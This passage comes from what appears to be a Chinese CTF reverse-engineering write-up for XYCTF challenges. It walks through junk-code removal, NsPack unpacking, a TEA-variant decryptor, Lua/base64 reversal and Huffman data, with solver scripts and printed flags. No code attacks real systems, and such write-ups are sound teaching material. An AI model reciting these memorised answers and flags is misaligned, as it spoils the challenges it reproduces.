class="line">assembly = disasm(code)</span><br><span class="line"><span class="built_in">print</span>(assembly)</span><br><span class="line"><span class="comment">#这个直接读汇编出exp？</span></span><br></pre></td></tr></table></figure><p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20240429004853677.png" alt="image-20240429004853677"></p><p>这里的call和下面的call的地址一眼假，当作花指令nop掉</p><p>u、p操作复原函数</p><p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20240429005643337.png" alt="image-20240429005643337"><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20240429005753142.png" alt="image-20240429005753142"></p><p>EXP:</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">cipher = [<span class="number">88</span>, <span class="number">88</span>, <span class="number">134</span>, <span class="number">87</span>, <span class="number">74</span>, <span class="number">118</span>, <span class="number">318</span>, <span class="number">101</span>, <span class="number">59</span>, <span class="number">92</span>, <span class="number">480</span>, <span class="number">60</span>, <span class="number">65</span>, <span class="number">41</span>, <span class="number">770</span>, <span class="number">110</span>,</span><br><span class="line"><span class="number">73</span>, <span class="number">31</span>, <span class="number">918</span>, <span class="number">39</span>, <span class="number">120</span>, <span class="number">27</span>, <span class="number">1188</span>, <span class="number">47</span>, <span class="number">77</span>,</span><br><span class="line"><span class="number">24</span>, <span class="number">1352</span>, <span class="number">44</span>, <span class="number">81</span>, <span class="number">23</span>, <span class="number">1680</span>, <span class="number">46</span>, <span class="number">85</span>, <span class="number">15</span>, <span class="number">1870</span>, <span class="number">66</span>, <span class="number">91</span>, <span class="number">16</span>, <span class="number">4750</span>]</span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(cipher)):</span><br><span class="line"><span class="keyword">if</span> i % <span class="number">4</span> == <span class="number">0</span>:</span><br><span class="line">flag += <span class="built_in">chr</span>(cipher[i] - i)</span><br><span class="line"><span class="keyword">elif</span> i % <span class="number">4</span> == <span class="number">1</span>:</span><br><span class="line">flag += <span class="built_in">chr</span>(cipher[i] + i)</span><br><span class="line"><span class="keyword">elif</span> i % <span class="number">4</span> == <span class="number">2</span>:</span><br><span class="line">flag += <span class="built_in">chr</span>(<span class="built_in">int</span>(cipher[i] / i))</span><br><span class="line"><span class="keyword">elif</span> i % <span class="number">4</span> == <span class="number">3</span>:</span><br><span class="line">flag += <span class="built_in">chr</span>(cipher[i] ^ i)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment"># XYCTF&#123;5b3e07567a9034d06851475481507a75&#125;</span></span><br></pre></td></tr></table></figure><h2 id="9-砸核桃"><a href="#9-砸核桃" class="headerlink" title="9.砸核桃"></a>9.砸核桃</h2><h5 id="NsPack壳儿"><a href="#NsPack壳儿" class="headerlink" title="NsPack壳儿"></a>NsPack壳儿</h5><p>[<a href="https://bbs.kanxue.com/thread-115901.htm">原创]NsPack 3.7 浅析 （7.3更新脱壳机和源码）-加壳脱壳-看雪-安全社区|安全招聘|kanxue.com</a></p><p>脱壳后简单分析：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">true_cipher = [<span class="number">0x00000012</span>, <span class="number">0x00000004</span>, <span class="number">0x00000008</span>, <span class="number">0x00000014</span>, <span class="number">0x00000024</span>,</span><br><span class="line"><span class="number">0x0000005C</span>, <span class="number">0x0000004A</span>, <span class="number">0x0000003D</span>,<span class="number">0x00000056</span>, <span class="number">0x0000000A</span>, <span class="number">0x00000010</span>, <span class="number">0x00000067</span>, <span class="number">0x00000000</span>,<span class="number">0x00000041</span>, <span class="number">0x00000000</span>, <span class="number">0x00000001</span>,</span><br><span class="line"><span class="number">0x00000046</span>, <span class="number">0x0000005A</span>, <span class="number">0x00000044</span>, <span class="number">0x00000042</span>, <span class="number">0x0000006E</span>,</span><br><span class="line"><span class="number">0x0000000C</span>, <span class="number">0x00000044</span>, <span class="number">0x00000072</span>,</span><br><span class="line"><span class="number">0x0000000C</span>, <span class="number">0x0000000D</span>, <span class="number">0x00000040</span>, <span class="number">0x0000003E</span>, <span class="number">0x0000004B</span>,</span><br><span class="line"><span class="number">0x0000005F</span>, <span class="number">0x00000002</span>, <span class="number">0x00000001</span>,</span><br><span class="line"><span class="number">0x0000004C</span>, <span class="number">0x0000005E</span>, <span class="number">0x0000005B</span>, <span class="number">0x00000017</span>, <span class="number">0x0000006E</span>,</span><br><span class="line"><span class="number">0x0000000C</span>, <span class="number">0x00000016</span>, <span class="number">0x00000068</span>,</span><br><span class="line"><span class="number">0x0000005B</span>, <span class="number">0x00000012</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000048</span>]</span><br><span class="line">XOR = [<span class="number">0x74</span>, <span class="number">0x68</span>, <span class="number">0x69</span>, <span class="number">0x73</span>, <span class="number">0x5F</span>, <span class="number">0x69</span>, <span class="number">0x73</span>, <span class="number">0x5F</span>, <span class="number">0x6E</span>, <span class="number">0x6F</span>, <span class="number">0x74</span>, <span class="number">0x5F</span>,</span><br><span class="line"><span class="number">0x66</span>, <span class="number">0x6C</span>, <span class="number">0x61</span>, <span class="number">0x67</span>, <span class="number">0x00</span>]</span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(true_cipher)):</span><br><span class="line">flag += <span class="built_in">chr</span>(true_cipher[j] ^ XOR[j % <span class="number">16</span>])</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment"># flag&#123;59b8ed8f-af22-11e7-bb4a-3cf862d1ee75&#125;</span></span><br></pre></td></tr></table></figure><h2 id="10-ezmath"><a href="#10-ezmath" class="headerlink" title="10.ezmath"></a>10.ezmath</h2><h5 id="exe-py-Z3求解器"><a href="#exe-py-Z3求解器" class="headerlink" title="exe-py-Z3求解器"></a>exe-py-Z3求解器</h5><p>(?要经常更新pyexe库啊。。)</p><p>其实这个题还是很考验分析的，</p><p>太长了分开</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">data=<span class="string">&quot;sum([flag[23] for _ in range(flag[23])]) + sum([flag[12] for _ in range(flag[12])]) + sum([flag[1] for _ in range(flag[1])]) - sum([flag[24] for _ in range(222)]) + sum([flag[22] for _ in range(flag[22])]) + sum([flag[31] for _ in range(flag[31])]) + sum([flag[26] for _ in range(flag[26])]) - sum([flag[9] for _ in range(178)]) - sum([flag[29] for _ in range(232)]) + sum([flag[17] for _ in range(flag[17])]) - sum([flag[23] for _ in range(150)]) - sum([flag[6] for _ in range(226)]) - sum([flag[7] for _ in range(110)]) + sum([flag[19] for _ in range(flag[19])]) + sum([flag[2] for _ in range(flag[2])]) - sum([flag[0] for _ in range(176)]) + sum([flag[10] for _ in range(flag[10])]) - sum([flag[12] for _ in range(198)]) + sum([flag[24] for _ in range(flag[24])]) + sum([flag[9] for _ in range(flag[9])]) - sum([flag[3] for _ in range(168)]) + sum([flag[8] for _ in range(flag[8])]) - sum([flag[2] for _ in range(134)]) + sum([flag[14] for _ in range(flag[14])]) - sum([flag[13] for _ in range(170)]) + sum([flag[4] for _ in range(flag[4])]) - sum([flag[10] for _ in range(142)]) + sum([flag[27] for _ in range(flag[27])]) + sum([flag[15] for _ in range(flag[15])]) - sum([flag[15] for _ in range(224)]) + sum([flag[16] for _ in range(flag[16])]) - sum([flag[11] for _ in range(230)]) - sum([flag[1] for _ in range(178)]) + sum([flag[28] for _ in range(flag[28])]) - sum([flag[5] for _ in range(246)]) - sum([flag[17] for _ in range(168)]) + sum([flag[30] for _ in range(flag[30])]) - sum([flag[21] for _ in range(220)]) - sum([flag[22] for _ in range(212)]) - sum([flag[16] for _ in range(232)]) + sum([flag[25] for _ in range(flag[25])]) - sum([flag[4] for _ in range(140)]) - sum([flag[31] for _ in range(250)]) - sum([flag[28] for _ in range(150)]) + sum([flag[11] for _ in range(flag[11])]) + sum([flag[13] for _ in range(flag[13])]) - sum([flag[14] for _ in range(234)]) + sum([flag[7] for _ in range(flag[7])]) - sum([flag[8] for _ in range(174)]) + sum([flag[3] for _ in range(flag[3])]) - sum([flag[25] for _ in range(242)]) + sum([flag[29] for _ in range(flag[29])]) + sum([flag[5] for _ in range(flag[5])]) - sum([flag[30] for _ in range(142)]) - sum([flag[26] for _ in range(170)]) - sum([flag[19] for _ in range(176)]) + sum([flag[0] for _ in range(flag[0])]) - sum([flag[27] for _ in range(168)]) + sum([flag[20] for _ in range(flag[20])]) - sum([flag[20] for _ in range(212)]) + sum([flag[21] for _ in range(flag[21])]) + sum([flag[6] for _ in range(flag[6])]) + sum([flag[18] for _ in range(flag[18])]) - sum([flag[18] for _ in range(178)])&quot;</span></span><br><span class="line">temp = data.split(<span class="string">&quot; + &quot;</span>)</span><br><span class="line">final = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">    <span class="built_in">print</span>(i)</span><br><span class="line">    final = []</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> temp:</span><br><span class="line">        t=j.split(<span class="string">&quot; - &quot;</span>)</span><br><span class="line">            final.extend(t)</span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> final:</span><br><span class="line">        <span class="keyword">if</span> <span class="string">f&quot;flag[<span class="subst">&#123;j&#125;</span>]&quot;</span> <span class="keyword">in</span> k:</span><br><span class="line">            <span class="built_in">print</span>(k)</span><br><span class="line"> <span class="comment">####</span></span><br><span class="line"><span class="number">0</span></span><br><span class="line"> <span class="built_in">sum</span>([flag[<span class="number">0</span>] <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">176</span>)]) </span><br><span class="line"> <span class="built_in">sum</span>([flag[<span class="number">0</span>] <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(flag[<span class="number">0</span>])]) </span><br><span class="line"><span class="number">1</span></span><br><span class="line"> <span class="built_in">sum</span>([flag[<span class="number">1</span>] <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(flag[<span class="number">1</span>])]) </span><br><span class="line"> <span class="built_in">sum</span>([flag[<span class="number">1</span>] <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">178</span>)]) </span><br><span class="line"><span class="number">2</span></span><br><span class="line"> <span class="built_in">sum</span>([flag[<span class="number">2</span>] <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(flag[<span class="number">2</span>])]) </span><br><span class="line"> <span class="built_in">sum</span>([flag[<span class="number">2</span>] <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">134</span>)]) </span><br><span class="line"><span class="number">3</span></span><br><span class="line"> <span class="built_in">sum</span>([flag[<span class="number">3</span>] <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">168</span>)]) </span><br><span class="line"> <span class="built_in">sum</span>([flag[<span class="number">3</span>] <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(flag[<span class="number">3</span>])]) </span><br><span class="line"><span class="number">4</span></span><br><span class="line"> <span class="built_in">sum</span>([flag[<span class="number">4</span>] <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(flag[<span class="number">4</span>])]) </span><br><span class="line"> <span class="built_in">sum</span>([flag[<span class="number">4</span>] <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">140</span>)]) </span><br></pre></td></tr></table></figure><p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20240429234131401.png" alt="image-20240429234131401"></p><p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20240429234223092.png" alt="image-20240429234223092"></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">chr</span>(flag[i]),end=<span class="string">&quot;&quot;</span>)</span><br></pre></td></tr></table></figure><h2 id="11-给阿姨倒一杯卡布奇诺"><a href="#11-给阿姨倒一杯卡布奇诺" class="headerlink" title="11.给阿姨倒一杯卡布奇诺"></a><strong>11.给阿姨倒一杯卡布奇诺</strong></h2><h5 id="tea"><a href="#tea" class="headerlink" title="tea"></a>tea</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"> <span class="built_in">array</span>[<span class="number">0</span>] = <span class="number">0x9B28ED45</span>;</span><br><span class="line">  <span class="built_in">array</span>[<span class="number">1</span>] = <span class="number">0x145EC6E9</span>;</span><br><span class="line">  <span class="built_in">array</span>[<span class="number">2</span>] = <span class="number">0x5B27A6C3</span>;</span><br><span class="line">  <span class="built_in">array</span>[<span class="number">3</span>] = <span class="number">0xE59E75D5</span>;</span><br><span class="line">  <span class="built_in">array</span>[<span class="number">4</span>] = <span class="number">0xE82C2500</span>;</span><br><span class="line">  <span class="built_in">array</span>[<span class="number">5</span>] = <span class="number">0xA4211D92</span>;</span><br><span class="line">  <span class="built_in">array</span>[<span class="number">6</span>] = <span class="number">0xCD8A4B62</span>;</span><br><span class="line">  <span class="built_in">array</span>[<span class="number">7</span>] = <span class="number">0xA668F440</span>;</span><br><span class="line">  key[<span class="number">0</span>] = <span class="number">0x65766967</span>;</span><br><span class="line">  key[<span class="number">1</span>] = <span class="number">0x756F795F</span>;</span><br><span class="line">  key[<span class="number">2</span>] = <span class="number">0x7075635F</span>;</span><br><span class="line">  key[<span class="number">3</span>] = <span class="number">0x6165745F</span>;</span><br><span class="line">sum += <span class="number">0x6E75316C</span>;</span><br><span class="line">data1           dd <span class="number">5F</span>797274h            ; DATA XREF: encrypt+<span class="number">2</span>A↑r</span><br><span class="line">.data:<span class="number">0000000000403010</span>                                         ; encrypt+<span class="number">33</span>↑w ...</span><br><span class="line">.data:<span class="number">0000000000403014</span>                 public data2</span><br><span class="line">.data:<span class="number">0000000000403014</span> ; <span class="type">uint32_t</span> data2</span><br><span class="line">.data:<span class="number">0000000000403014</span> data2           dd <span class="number">64726168</span>h            ; DATA XREF: encrypt+<span class="number">39</span>↑r</span><br><span class="line">.data:<span class="number">0000000000403014</span>                                </span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> data1 = <span class="number">0x5F797274</span>;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> data2 = <span class="number">0x64726168</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">decrypto</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> *cipher, <span class="type">unsigned</span> <span class="type">int</span> *key)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> v0, v1;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> t0, t1;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> sum = <span class="number">0x6E75316C</span>ULL * <span class="number">32</span>;</span><br><span class="line"></span><br><span class="line">    v0 = *cipher;</span><br><span class="line">v1 = cipher[<span class="number">1</span>];</span><br><span class="line">t0 = v0;</span><br><span class="line">t1 = v1;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">31</span>; i &gt;= <span class="number">0</span>; --i)</span><br><span class="line">&#123;</span><br><span class="line">v1 -= ((v0 &gt;&gt; <span class="number">5</span>) + key[<span class="number">3</span>]) ^ (v0 + sum) ^ (key[<span class="number">2</span>] + <span class="number">16</span> * v0) ^ (sum +i);</span><br><span class="line">v0 -= ((v1 &gt;&gt; <span class="number">5</span>) + key[<span class="number">1</span>]) ^ (v1 + sum) ^ (*key + <span class="number">16</span> * v1) ^ (sum + i);</span><br><span class="line">sum -= <span class="number">0x6E75316C</span>;</span><br><span class="line">&#125;</span><br><span class="line">*cipher = v0 ^ data1;</span><br><span class="line">cipher[<span class="number">1</span>] = v1 ^ data2;</span><br><span class="line">data1 = t0;</span><br><span class="line">data2 = t1;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> cipher[<span class="number">8</span>];</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> key[<span class="number">4</span>];</span><br><span class="line"><span class="type">int</span> length, i;</span><br><span class="line">cipher[<span class="number">0</span>] = <span class="number">2603150661</span>;</span><br><span class="line">cipher[<span class="number">1</span>] = <span class="number">0x145EC6E9</span>;</span><br><span class="line">cipher[<span class="number">2</span>] = <span class="number">0x5B27A6C3</span>;</span><br><span class="line">cipher[<span class="number">3</span>] = <span class="number">0xE59E75D5</span>;</span><br><span class="line">cipher[<span class="number">4</span>] = <span class="number">0xE82C2500</span>;</span><br><span class="line">cipher[<span class="number">5</span>] = <span class="number">0xA4211D92</span>;</span><br><span class="line">cipher[<span class="number">6</span>] = <span class="number">0xCD8A4B62</span>;</span><br><span class="line">cipher[<span class="number">7</span>] = <span class="number">0xA668F440</span>;</span><br><span class="line">key[<span class="number">0</span>] = <span class="number">0x65766967</span>;</span><br><span class="line">key[<span class="number">1</span>] = <span class="number">0x756F795F</span>;</span><br><span class="line">key[<span class="number">2</span>] = <span class="number">0x7075635F</span>;</span><br><span class="line">key[<span class="number">3</span>] = <span class="number">0x6165745F</span>;</span><br><span class="line">length = <span class="keyword">sizeof</span>(cipher);</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> *in = (<span class="type">unsigned</span> <span class="type">int</span> *)cipher;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> *out = (<span class="type">unsigned</span> <span class="type">char</span> *)cipher;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">8</span>; i += <span class="number">2</span>)</span><br><span class="line">    decrypto(in + i, key);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;flag&#123;&quot;</span>);</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; length; i++)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, out[i]);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;&#125;&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// flag&#123;133bffe401d223a02385d90c5f1ca377&#125;</span></span><br></pre></td></tr></table></figure><p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20240430002632073.png" alt="image-20240430002632073"></p><h2 id="12-what’s-this"><a href="#12-what’s-this" class="headerlink" title="12.what’s this"></a>12.<strong>what’s this</strong></h2><h5 id="Lua加密？"><a href="#Lua加密？" class="headerlink" title="Lua加密？"></a>Lua加密？</h5><p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20240430010432485.png" alt="image-20240430010432485"></p><p>使用XOR函数将字符与数字8进行异或操作，再加上3，base64加密，再进行字符替换</p><p>直接逆向逻辑，exp：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">cipher = <span class="string">&quot;==AeuFEcwxGPuJ0PBNzbC16ctFnPB5DPzI0bwx6bu9GQ2F1XOR1U&quot;</span></span><br><span class="line">new_cipher = cipher[::-<span class="number">1</span>]</span><br><span class="line">new_cipher = new_cipher.replace(<span class="string">&quot;3&quot;</span>, <span class="string">&quot;g&quot;</span>)</span><br><span class="line">new_cipher = new_cipher.replace(<span class="string">&quot;4&quot;</span>, <span class="string">&quot;H&quot;</span>)</span><br><span class="line">new_cipher = new_cipher.replace(<span class="string">&quot;6&quot;</span>, <span class="string">&quot;W&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Xor</span>(<span class="params">num1, num2</span>):</span><br><span class="line">tmp1 = num1</span><br><span class="line">tmp2 = num2</span><br><span class="line">str_result = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">while</span> tmp1 != <span class="number">0</span> <span class="keyword">or</span> tmp2 != <span class="number">0</span>:</span><br><span class="line">s1 = tmp1 % <span class="number">2</span></span><br><span class="line">s2 = tmp2 % <span class="number">2</span></span><br><span class="line"><span class="keyword">if</span> s1 == s2:</span><br><span class="line">str_result = <span class="string">&quot;0&quot;</span> + str_result</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">str_result = <span class="string">&quot;1&quot;</span> + str_result</span><br><span class="line">tmp1 = tmp1 // <span class="number">2</span></span><br><span class="line">tmp2 = tmp2 // <span class="number">2</span></span><br><span class="line"><span class="keyword">return</span> <span class="built_in">int</span>(str_result, <span class="number">2</span>)</span><br><span class="line">d_cipher = base64.b64decode(new_cipher)</span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> char <span class="keyword">in</span> d_cipher:</span><br><span class="line">flag += <span class="built_in">chr</span>(Xor(char - <span class="number">3</span>, <span class="number">8</span>))</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment"># XYCTF&#123;5dcbaed781363fbfb7d8647c1aee6c&#125;</span></span><br></pre></td></tr></table></figure><h2 id="13-馒头"><a href="#13-馒头" class="headerlink" title="13.馒头"></a>13.馒头</h2><h5 id="哈夫曼编码"><a href="#哈夫曼编码" class="headerlink" title="哈夫曼编码"></a>哈夫曼编码</h5><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">data = [<span class="number">0x000008DE</span>, <span class="number">0x00000395</span>, <span class="number">0x000001BE</span>, <span class="number">0x000000D9</span>, <span class="number">0x0000006A</span>, <span class="number">0x00000033</span>,</span><br><span class="line"><span class="number">0x00000014</span>, <span class="number">0x0000000F</span>, <span class="number">0x00000011</span>,</span><br><span class="line"><span class="number">0x000000E5</span>, <span class="number">0x00000072</span>, <span class="number">0x00000010</span>, <span class="number">0x0000000B</span>, <span class="number">0x000001D7</span>, <span class="number">0x000000E9</span>,</span><br><span class="line"><span class="number">0x00000074</span>, <span class="number">0x0000000E</span>, <span class="number">0x0000000D</span>,</span><br><span class="line"><span class="number">0x000000EE</span>, <span class="number">0x00000076</span>, <span class="number">0x0000000C</span>, <span class="number">0x00000007</span>, <span class="number">0x00000549</span>, <span class="number">0x0000022D</span>,</span><br><span class="line"><span class="number">0x000000F8</span>, <span class="number">0x0000007B</span>, <span class="number">0x00000006</span>,</span><br><span class="line"><span class="number">0x00000018</span>, <span class="number">0x00000135</span>, <span class="number">0x00000089</span>, <span class="number">0x00000043</span>, <span class="number">0x00000003</span>, <span class="number">0x00000005</span>,</span><br><span class="line"><span class="number">0x000000AC</span>, <span class="number">0x00000054</span>, <span class="number">0x00000004</span>,</span><br><span class="line"><span class="number">0x00000001</span>, <span class="number">0x0000031C</span>, <span class="number">0x0000017F</span>, <span class="number">0x000000BA</span>, <span class="number">0x00000059</span>, <span class="number">0x00000002</span>,</span><br><span class="line"><span class="number">0x00000008</span>, <span class="number">0x000000C5</span>, <span class="number">0x00000061</span>,</span><br><span class="line"><span class="number">0x00000030</span>, <span class="number">0x00000017</span>, <span class="number">0x0000000A</span>, <span class="number">0x00000015</span>, <span class="number">0x0000019D</span>, <span class="number">0x000000CB</span>,</span><br><span class="line"><span class="number">0x00000065</span>, <span class="number">0x00000016</span>, <span class="number">0x00000009</span>,</span><br><span class="line"><span class="number">0x000000D2</span>, <span class="number">0x00000068</span>, <span class="number">0x00000013</span>, <span class="number">0x00000012</span>]</span><br><span class="line">num = []</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(data))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(data)):</span><br><span class="line">num.append(data[i])</span><br><span class="line"><span class="built_in">print</span>(num)</span><br><span class="line"><span class="comment">#[2270, 917, 446, 217, 106, 51, 20, 15, 17, 229, 114, 16, 11, 471, 233, 116, 14,</span></span><br><span class="line"><span class="number">13</span>, <span class="number">238</span>, <span class="number">118</span>, <span class="number">12</span>, <span class="number">7</span>, <span class="number">1353</span>, <span class="number">557</span>, <span class="number">248</span>, <span class="number">123</span>, <span class="number">6</span>, <span class="number">24</span>, <span class="number">309</span>, <span class="number">137</span>, <span class="number">67</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">172</span>, <span class="number">84</span>, <span class="number">4</span>,</span><br><span class="line"><span class="number">1</span>, <span class="number">796</span>, <span class="number">383</span>, <span class="number">186</span>, <span class="number">89</span>, <span class="number">2</span>, <span class="number">8</span>, <span class="number">197</span>, <span class="number">97</span>, <span class="number">48</span>, <span class="number">23</span>, <span class="number">10</span>, <span class="number">21</span>, <span class="number">413</span>, <span class="number">203</span>, <span class="number">101</span>, <span class="number">22</span>, <span class="number">9</span>, <span class="number">210</span>,</span><br><span class="line"><span class="number">104</span>, <span class="number">19</span>, <span class="number">18</span>]</span><br></pre></td></tr></table></figure><h2 id="15-舔狗四部曲—记忆的时光机"><a href="#15-舔狗四部曲—记忆的时光机" class="headerlink" 